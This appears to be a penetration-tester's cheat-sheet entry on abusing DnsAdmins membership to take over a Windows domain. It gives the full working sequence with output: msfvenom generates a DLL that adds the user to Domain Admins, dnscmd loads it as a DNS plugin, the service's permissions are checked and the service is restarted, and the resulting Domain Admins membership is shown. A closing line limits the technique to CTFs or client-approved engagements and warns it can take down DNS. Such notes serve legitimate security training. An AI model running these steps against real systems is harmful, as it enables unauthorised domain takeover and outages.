Members of the `DnsAdmins` group have access to DNS information on the network. The DNS service runs as `NT AUTHORITY\SYSTEM`, so membership in this group could potentially be leveraged to escalate privileges on a Domain Controller or in a situation where a separate server is acting as the DNS server for the domain.

```bash
C:\Users\netadm>net localgroup "DnsAdmins"
Alias name     DnsAdmins
Comment        DNS Administrators Group

Members

-------------------------------------------------------------------------------
netadm
The command completed successfully.
```

Generate malicious DLL:

```bash
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
```

Load custom DLL:

```bash
dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Downloads\adduser.dll
```

The service needs to be restarted.  Typically, members of this group do not have permissions to restart the service, but it is worth checking.

We need to get our SID:

```bash
wmic useraccount where name="netadm" get sid

SID
S-1-5-21-669053619-2741956077-1013132368-1109
```

Check permissions:

We are looking for `RPWP` in the output below:

```bash
sc.exe sdshow DNS

D:(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SO)(A;;RPWP;;;S-1-5-21-669053619-2741956077-1013132368-1109)
```

Once confirmed, stop and start the service:

```bash
sc stop dns
sc start dns
```

Now this user is a member of the domain admins group:

```bash
C:\Users\netadm>net group "Domain Admins" /dom
Group name     Domain Admins
Comment        Designated administrators of the domain

Members

-------------------------------------------------------------------------------
Administrator            netadm
The command completed successfully.
```

Doing this in a CTF environment is fine, however on a real engagement, check with the client as this attack has the potential to take down DNS for the entire Active Directory environment. Use with caution!




